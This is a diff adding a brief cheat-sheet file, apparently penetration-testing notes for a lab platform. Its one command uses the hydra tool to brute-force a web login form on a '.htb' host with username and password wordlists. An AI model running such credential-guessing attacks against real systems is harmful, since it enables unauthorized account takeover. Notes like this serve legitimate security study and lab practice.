@@ -1,0 +1,9 @@
+[-]======================================[-]
+    Hydra
+[-]======================================[-]
+
+- ---] Quick Commands
+======================
+
+# Post request
+hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
